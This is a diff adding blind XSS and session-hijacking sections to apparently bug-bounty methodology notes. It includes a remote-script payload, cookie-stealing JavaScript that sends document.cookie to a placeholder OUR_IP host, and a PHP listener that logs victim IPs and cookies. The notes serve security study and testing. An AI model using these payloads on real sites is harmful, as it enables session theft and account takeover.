@@ -104,6 +104,40 @@ For example, this will trigger a xss on error, which will occur because src is e
  src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&
  auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
  ```
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> BLIND XSS
+If we get a request for /username, then we know that the username field is vulnerable to XSS, and so on. With that, we can start testing various XSS payloads that load a remote script and see which of them sends us a request. 
+```
+<script src="http://OUR_IP/username"></script>
+```
+For this reason we need a backend server to receive the request
+```
+@htb[/htb]$ mkdir /tmp/tmpserver
+@htb[/htb]$ cd /tmp/tmpserver
+@htb[/htb]$ sudo php -S 0.0.0.0:80
+PHP 7.4.15 Development Server (http://0.0.0.0:80) started
+```
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Session Hijiacking
+Session Hijiacking is just an xss attack that target the cookies to steal the session.
+
+Typical payload for stealing cookies.
+```
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+A small backend server to receive cookies and IP
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
 
 ------------------------------------------
 # EXTRAS
